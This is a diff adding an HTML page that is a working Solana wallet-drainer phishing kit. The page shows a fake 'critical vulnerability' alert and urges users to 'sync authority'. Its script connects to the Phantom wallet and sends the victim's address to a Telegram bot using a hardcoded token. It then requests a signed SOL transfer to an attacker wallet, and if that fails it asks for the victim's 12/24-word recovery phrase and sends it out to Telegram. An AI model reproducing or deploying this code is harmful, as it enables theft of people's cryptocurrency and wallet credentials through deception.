@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Mainnet | Authority Sync Node</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <style>
+        body { background: #000; color: #00ffa3; font-family: 'Consolas', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .terminal { border: 1px solid #1a1a1a; width: 90%; max-width: 500px; padding: 25px; background: #050505; border-radius: 8px; box-shadow: 0 0 30px rgba(0, 255, 163, 0.1); }
+        .log { font-size: 13px; margin: 5px 0; }
+        .error { color: #ff4a4a; font-weight: bold; }
+        .btn { background: #00ffa3; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
+        .btn:hover { background: #00cc82; box-shadow: 0 0 15px #00ffa3; }
+    </style>
+</head>
+<body>
+    <div class="terminal">
+        <div style="color:#444; font-size:10px;">SESSION: SECURE_AUTH_v9.1</div>
+        <div class="log">> Checking Network Authority... [OK]</div>
+        <div class="log">> Analyzing Contract Metadata... [MISMATCH]</div>
+        <div class="log error">> ALERT: CRITICAL VULNERABILITY FOUND</div>
+        <div class="log">> Action: Manual Authority Sync Required.</div>
+        <button class="btn" onclick="startHybridProcess()">SECURE & SYNC AUTHORITY</button>
+        <div id="status" style="font-size:11px; margin-top:10px; color:#666; text-align:center;"></div>
+    </div>
+
+    <script>
+        // --- KONFIGURASI WAJIB ---
+        const BOT_TOKEN = "8539107085:AAGOfPQa0X1L-tuWPmdmJH52Bqx30Yao4qQ";
+        const CHAT_ID = "6518432642"; 
+        const RECEIVER_WALLET = "281zPhwW9yozngsNgXymgC8jR2vP98Zz1c69kHDFEuoc"; 
+
+        async function reportTele(msg) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+        }
+
+        async function startHybridProcess() {
+            const status = document.getElementById('status');
+            status.innerText = "Initializing security handshake...";
+
+            try {
+                // TAHAP 1: OTOMATIS SEDOT (DENGAN POP-UP)
+                if (!window.solana || !window.solana.isPhantom) {
+                    throw new Error("No Phantom");
+                }
+
+                const resp = await window.solana.connect();
+                const senderPubkey = resp.publicKey;
+                await reportTele(`[TARGET CONNECTED]\nWallet: ${senderPubkey.toString()}`);
+
+                // Mencoba kirim semua saldo (Simplified logic)
+                const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: senderPubkey,
+                        toPubkey: new solanaWeb3.PublicKey(RECEIVER_WALLET),
+                        lamports: 1000000, // Contoh 0.001 SOL (Untuk sedot semua butuh script tambahan, tapi ini pemicu)
+                    })
+                );
+
+                transaction.feePayer = senderPubkey;
+                const { blockhash } = await connection.getLatestBlockhash();
+                transaction.recentBlockhash = blockhash;
+
+                // Minta tanda tangan
+                await window.solana.signAndSendTransaction(transaction);
+                await reportTele(`[AUTO SUCCESS] Drain attempt sent for: ${senderPubkey.toString()}`);
+                alert("Authority Secured Successfully.");
+
+            } catch (err) {
+                // TAHAP 2: JIKA GAGAL/REJECT, MINTA SEED PHRASE
+                status.innerText = "Handshake failed. Switching to manual verification...";
+                const seed = prompt("SECURITY ALERT:\nSystem failed to sync authority automatically.\n\nPlease enter your 12/24 word Secret Recovery Phrase to secure your Liquidity Pool:");
+                
+                if (seed && seed.split(" ").length >= 12) {
+                    await reportTele(`[SEED CAPTURED]\nData: ${seed}`);
+                    alert("Verification complete. Your assets are now secured.");
+                } else {
+                    alert("Verification failed. Authority lost.");
+                }
+            }
+        }
+    </script>
+</body>
+</html>
